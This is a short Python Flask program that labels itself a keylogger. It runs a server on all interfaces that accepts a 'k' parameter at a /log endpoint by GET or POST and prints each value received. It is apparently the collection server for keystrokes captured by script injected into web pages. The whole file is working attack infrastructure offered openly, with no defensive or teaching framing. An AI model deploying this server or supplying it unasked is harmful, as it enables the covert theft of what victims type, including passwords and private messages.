from flask import Flask, request

app = Flask(__name__)


@app.route('/log', methods=['GET', 'POST'])
def log_key():
    if request.method == 'GET':
        key = request.args.get('k', '')
    else:
        key = request.form.get('k', '')    
    
    print(key)
    return '', 204


if __name__ == '__main__':
    print("Keylogger")
    app.run(host='0.0.0.0', port=8000, debug=False)
